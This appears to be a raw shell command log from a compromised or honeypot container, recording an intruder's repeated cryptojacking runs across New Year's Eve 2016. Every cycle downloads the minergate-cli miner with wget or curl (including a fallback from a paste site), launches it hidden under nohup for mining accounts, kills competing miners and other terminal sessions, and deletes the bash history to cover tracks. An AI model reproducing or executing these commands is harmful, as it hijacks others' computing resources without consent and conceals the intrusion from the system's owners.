+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 19:01 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 19:01 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 19:01 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 19:01 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 19:31 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 19:31 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 19:31 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 19:31 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 19:31 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 19:31 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 19:31 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 19:31 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 19:31 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+kill -9 6577;  ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+kill -9 6368;  ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 19:35 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 19:36 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 19:36 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 19:36 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 19:36 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20161231 19:36 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20161231 19:36 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 20:02 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 20:02 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 20:02 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 20:02 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 20:02 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 20:33 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 20:33 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 20:33 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 20:33 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 20:33 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 20:33 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 20:33 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 20:33 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 20:33 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 21:03 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 21:03 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 21:03 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 21:03 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 21:03 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 21:03 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 21:03 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 21:03 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 21:03 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+kill -9 7038;  ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+kill -9 6829;  ### root@f5e57551b879 /dev/pts/3 20161231 21:21 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20161231 21:22 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 21:22 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 21:22 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 21:22 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 21:22 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 21:22 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 21:22 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20161231 21:22 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20161231 21:22 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 22:05 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 22:05 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 22:05 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 22:05 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 22:05 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 22:36 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 22:36 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 22:36 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 22:36 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 22:36 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 22:36 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 22:36 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 22:36 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 22:36 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+kill -9 7429;  ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+kill -9 7304;  ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 23:03 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 23:04 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 23:04 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 23:04 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161231 23:04 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161231 23:04 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20161231 23:04 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20161231 23:04 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 23:07 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 23:07 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 23:07 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 23:07 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 23:07 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 23:37 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 23:37 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 23:37 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 23:37 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 23:37 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 23:37 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 23:37 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 23:37 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 23:37 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 00:08 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 00:08 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 00:08 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 00:08 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 00:08 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 00:08 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 00:08 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 00:08 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 00:08 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 00:39 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 00:39 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 00:39 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 00:39 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 00:39 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 00:39 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 00:39 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 00:39 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 00:39 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20170101 00:52 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20170101 00:52 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 00:52 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 00:52 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 00:52 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 00:52 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 00:52 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 00:52 /notebooks
+kill -9 7963;  ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /notebooks
+kill -9 7670;  ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 00:53 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20170101 00:54 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20170101 00:54 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 01:10 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 01:10 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 01:10 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 01:11 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 01:11 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 01:42 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 01:42 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 01:42 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 01:42 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 01:42 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 01:42 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 01:42 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 01:42 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 01:42 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 02:13 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 02:13 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 02:13 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 02:13 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 02:13 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 02:13 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 02:13 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 02:13 /root/.deb/opt/minergate-cli
